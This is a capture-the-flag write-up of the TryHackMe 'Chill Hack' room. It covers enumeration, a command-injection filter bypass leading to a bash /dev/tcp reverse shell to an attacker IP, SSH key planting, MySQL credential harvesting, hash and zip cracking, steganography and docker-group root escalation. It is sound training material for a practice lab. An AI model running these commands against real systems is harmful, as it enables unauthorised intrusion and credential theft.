# Summary
- link: https://tryhackme.com/room/chillhack
- Skills required: enumeration, bypass filtering for OS command injection, reverse shell, Linux privilege escalation, mySQL, data exposure via steganography.
- Tools: nmap, ffuf, cyberchef, ssh, ssh-keygen, steghide, stegseek, zip2john, johng
- Learning: I would rate it a relatively difficult easy room given the multi-layer vulunerabilities and time required. It took me 3 hours.

# Details to get the flag:
- with the given IP a basic port discovery was done by nmap `nmap -sS ip`. When ports were discovered, more switches were used to reveal details.
- <img width="599" height="743" alt="nmap" src="https://github.com/user-attachments/assets/92b1965e-cd2c-4853-9ba6-d317787ad8c2" />
- Found anonymous FTP port 21, http port 80 and SSH port 22.
- FFUF was started to find sub directories. BURP was started record details while I was enumerating manyually.
- Nothing interesting found during manual enumeration. Before going on to the secret folder found by FFUF, these were the information on hands including the note.txt found via FTP.
- <img width="914" height="712" alt="notetxt" src="https://github.com/user-attachments/assets/a8328655-af4c-4ec7-83f4-8b59ae2638bb" />
> ftp Anonymous read only
Linux 4.15, Apache 2.4.41
email: demo@gmail.com : shouldn't be anything interesting... index.html
JQuery 1.11.1: searchsploit possible XXS, msfconsole file upload
note.txt: Anurodh told me that there is some filtering on strings being put in the command -- Apaar
user Anurodh
user Apaar

- in the /secret site, it was possible to input linux command and display output on the screen.
- <img width="1346" height="412" alt="Screenshot from 2025-10-12 20-45-44" src="https://github.com/user-attachments/assets/66ebff3b-e7f9-4078-a59e-50104fe5473e" />
- Efford was make trying to check any client side filtering - negative. So it would be server side filtering. Here were the commands I trided.
  - works: whoami, groups, id, /bin/ls
  - doesn't work: ls, cat, /bin/cat index.php - not sure why it didn't work.
- it would be good to have a reverse shell here by having `/bin/bash` instead of `bash`
- This was the payload and it worked: `/bin/bash -c 'bash -i >& /dev/tcp/10.14.106.24/4444 0>&1'`
- It wasn't difficult to find the first foothold and I thought it would be another straight forwarding CTF.
- Enumeration was done again. There was an interesting file `/var/www/files/index.php` revealed a root username password for mySQL dbname webportal. Also another file '/var/www/files/account.php` revealed the hash type is md5.
- <img width="1161" height="574" alt="indexphp root password" src="https://github.com/user-attachments/assets/cae43b9b-e7ff-4ce0-85ef-fb17fb33ce47" />
- after additional enumeration, it was found that the current acess, www-data, could run a file /home/apaar/.helpline.sh. The file would run a command as apaar whatever command input into the file.
- <img width="1095" height="250" alt="sudo l vul found" src="https://github.com/user-attachments/assets/8cbf0b84-587e-406d-8f72-3f7e5c70a470" />
- so i ran it as apaar, `sudo -u apaar /home/apaar/.helpline.sh` and entered `/etc/bash` to spwan a shell as apaar.
- <img width="853" height="571" alt="esc priv to apaar" src="https://github.com/user-attachments/assets/be2a4d5a-c82c-4ad7-a0dd-5d54c430431b" />
- obtained the first flag
- <img width="844" height="569" alt="flag1" src="https://github.com/user-attachments/assets/3fb773b5-9c0a-4df2-896c-f9eb608248ad" />
- With all the progress done so far, `ssh-keygen` was done to generate a pair of keys. The pubic key was copied to /home/apaar/.ssh/authorized_key, and the private was copied to own attack machine as id_rsa. After `chmod 666 id_rsa`, a proper SSH session was obtainer.
- <img width="1517" height="927" alt="SSH apaar good" src="https://github.com/user-attachments/assets/58454e83-ee97-40c9-961b-08dacda9cc40" />
- At this stage, I felt one way would be to further enmerate (sudo-l gave no additional clue, /etc/crontab gave no hint, tried couple of SUID didn't work) by using linpeas.sh, or another way would be to explore the mySQL using password obtained in var/www/files/index.php. I felt the 2nd option was more promising.
- to confirm mySQL was working:
- <img width="1009" height="387" alt="mysql details" src="https://github.com/user-attachments/assets/27a3103e-98d2-4792-a9be-16818614b965" />
- Then the password hashes for anurodh and apaar were found.
- <img width="998" height="691" alt="anurodh and apaar hash found" src="https://github.com/user-attachments/assets/952da44a-8469-418d-997e-88f5c0848ab5" />
- Next, hashcat was used to brute force cracking the password `$ hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`.
- <img width="820" height="685" alt="anurodh pwd" src="https://github.com/user-attachments/assets/f3563668-4e24-4597-9b3e-1e17a9d74c03" />
- looking at the file index.php, the password would need to be used to login an internal webpage - where the port was not revealed during the enumeration by nmap. For reference I always do a `nmap -p-` running in the background to show anything missed in the first enumeration as a sanity check. Therefore, I would need to find out the port under apaar's login. `netstat -tuln` didn't work and `ss -tuln` worked, and it revealed 9001 was likely be the port opening for that index.php login page. Then I did a local port forwarding `ssh -i id_rsa -L 9001:127.0.0.1:9001 apaar@10.201.35.13`, so I could visit 127.0.0.1:9001.
- <img width="1901" height="952" alt="local port forwarding" src="https://github.com/user-attachments/assets/0214bae0-5fee-47c1-8c57-380b12f9066c" />
- This was the page after login:
- <img width="1901" height="952" alt="aftrer login internal http" src="https://github.com/user-attachments/assets/3876b0ab-511f-4459-8315-cfff7d7ab881" />
- The clue was look in the dark to find your answer. The hacker looke 'dark', and by looking at the folder /var/www/files again under images there are two files. The peg was checked with steghide and a zipped file was found within.
- <img width="638" height="257" alt="steghide" src="https://github.com/user-attachments/assets/e491f634-dc96-4d8a-9e39-13f36044da01" />
- Stegseek was used to extract the zipped file.
- <img width="662" height="216" alt="stegseek" src="https://github.com/user-attachments/assets/87474239-78dd-4152-9082-17c35734dba8" />
- Unfortunatly the zipped file was password protected. zip2john was used to reveal password
- <img width="695" height="396" alt="zip2john crack" src="https://github.com/user-attachments/assets/147d445b-83c9-4028-bdc4-9adc35ef4d2e" />
- that was the password to for the zipped file only. After unzipping the file, it was a file called source_code.php. it revealed an email POP password in base64. "IWQwbnRLbjB3bVlwQHNzdzByZA==") and it was decoded in cyberchef. As per the source code it is actually Anurodh's password.
- <img width="945" height="873" alt="source_code php" src="https://github.com/user-attachments/assets/ee67f440-3f34-40e0-a6aa-8568c550815f" />
- Command `su anurodh` was used with the password cracked to switch account access ot user Anuroth. It was successful. SSH would work the same. Also it was found Anuroth was in the docker group.
- <img width="1049" height="290" alt="docker group" src="https://github.com/user-attachments/assets/7491a49b-6b86-4441-a1ce-0196cac023d5" />
- As per GTFOBins, a command was found to spawn a root shell.
- <img width="864" height="316" alt="image" src="https://github.com/user-attachments/assets/0b9473ae-3a81-4c68-89ad-ab8b33985ce2" />
- Then I found and natvigated to where the docker folder is, and run the command given by GTFOBins and obtained a shell.
- <img width="864" height="316" alt="image" src="https://github.com/user-attachments/assets/015f49f6-7047-405e-8e2c-1fad01fab132" />






